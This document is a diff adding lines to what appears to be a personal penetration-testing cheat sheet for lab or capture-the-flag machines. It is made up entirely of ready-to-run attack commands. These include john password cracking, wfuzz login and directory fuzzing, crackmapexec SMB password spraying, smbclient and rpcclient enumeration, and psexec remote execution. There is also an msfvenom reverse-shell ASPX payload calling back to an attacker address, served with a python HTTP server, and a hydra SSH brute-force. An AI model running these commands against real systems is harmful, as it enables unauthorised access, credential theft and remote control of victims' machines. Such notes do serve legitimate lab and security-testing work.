@@ -3,3 +3,15 @@ nmap -sC -sV -v IP
 john --wordlist=/usr/share/wordlists/rockyou.txt --format='dynamic=sha512($p.$s)' hash.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA512 hash.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+wfuzz -z file,wordlist/others/common_pass.txt -d "uname=FUZZ&pass=FUZZ"  --hc 302 http://IP/page.php
+wfuzz --hc 404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://IP/FUZZ
+crackmapexec smb IP -u user.txt -p pass.txt --no-bruteforce --continue-on-success
+crackmapexec smb 10.10.107.113 -u user.txt -p pass.txt --shares
+crackmapexec smb IP -u user.txt -p pass.txt --spider shre
+smbclient -U "user" //IP/share
+smbclient -L //IP
+rpcclient -U USER IP
+psexec.py DOM/USER@IP
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.0.150 LPORT=9876 -f aspx -o lolo.aspx
+python -m http.server 9880
+hydra -l root -P dico -s 22 -f 192.168.1.1 ssh
